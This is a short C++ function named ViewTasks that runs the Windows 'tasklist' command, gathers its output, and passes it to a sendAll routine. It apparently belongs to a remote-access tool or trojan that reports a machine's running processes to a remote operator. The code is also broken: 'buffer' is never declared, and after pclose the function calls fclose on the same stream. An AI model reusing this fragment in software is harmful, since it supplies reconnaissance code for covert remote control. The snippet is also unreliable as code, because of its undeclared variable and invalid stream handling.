void ViewTasks()
{
    FILE* stream = popen("tasklist 2>&1", "r");
    std::string data;

    if (stream) {
        while (!feof(stream))
        if (fgets(buffer, sizeof(buffer), stream) != NULL) {
            data.append(buffer);
        
        } pclose(stream);
    
    } sendAll(data);

    fclose(stream);
}